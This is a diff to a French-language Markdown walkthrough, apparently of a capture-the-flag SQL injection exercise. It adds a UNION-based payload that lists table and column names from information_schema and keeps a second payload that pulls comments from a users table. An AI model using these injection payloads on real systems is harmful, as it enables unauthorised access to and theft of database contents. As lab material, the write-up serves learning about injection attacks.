@@ -10,7 +10,14 @@ First name: Flag
 Surname : GetThe
 ````
 
-Une première tentative d’injection SQL :
+Pour faire une `Union attack` il faudrait lister les colomnes de la table `user` 
+
+```sql
+1 UNION SELECT table_name, column_name
+FROM information_schema.columns
+```
+
+Il faudrait ensuite faire une première tentative d’injection SQL:
 
 ```sql
 ID: 1 UNION SELECT commentaire, NULL FROM users
